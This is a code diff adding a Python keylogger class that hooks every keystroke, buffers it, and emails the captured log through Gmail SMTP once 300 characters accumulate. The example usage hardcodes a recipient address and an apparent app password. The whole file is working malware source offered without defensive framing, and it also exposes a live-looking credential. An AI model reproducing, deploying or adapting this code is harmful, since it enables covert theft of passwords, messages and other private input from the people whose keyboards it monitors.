@@ -1,0 +1,58 @@
+import keyboard
+import smtplib
+import time
+
+class Keylogger:
+    def __init__(self, log_length, email, password):
+        self.initial_log_message = "[+] Keylogger has started"
+        self.log = self.initial_log_message
+        self.log_length = log_length  # Threshold for sending email
+        self.email = email
+        self.password = password
+
+    def append_log(self, string):
+        self.log += string
+        if len(self.log) - len(self.initial_log_message) >= self.log_length:
+            self.mail()
+
+    def key_pressed(self, key):
+        try:
+            if hasattr(key, 'char') and key.char:
+                key_special = key.char
+            else:
+                if key.name == 'space':
+                    key_special = " "
+                else:
+                    key_special = " " + key.name + " "
+            self.append_log(key_special)
+        except AttributeError as e:
+            print(f"Error processing key: {str(e)}")
+
+    def mail_sender(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        try:
+            server.login(email, password)
+            server.sendmail(email, email, message)
+        except smtplib.SMTPAuthenticationError as e:
+            print("Failed to authenticate with SMTP server. Check your credentials or App Password. Error:", e)
+        finally:
+            server.quit()
+
+    def mail(self):
+        if len(self.log) - len(self.initial_log_message) >= self.log_length:
+            self.mail_sender(self.email, self.password, "\n\n" + self.log)
+        self.log = self.initial_log_message  # Reset the log back to initial message after sending
+
+    def launch(self):
+        keyboard.on_press(self.key_pressed)
+        try:
+            while True:
+                time.sleep(10)  # Sleep to reduce CPU usage, no operational effect on the keylogger functionality
+        except KeyboardInterrupt:
+            print("Keylogger terminated by user.")
+
+# Example usage:
+if __name__ == "__main__":
+    logger = Keylogger(300, "test.key.logger.54@gmail.com", "dcjn ducj iznx oijs")  # Set the character limit to 300
+    logger.launch()
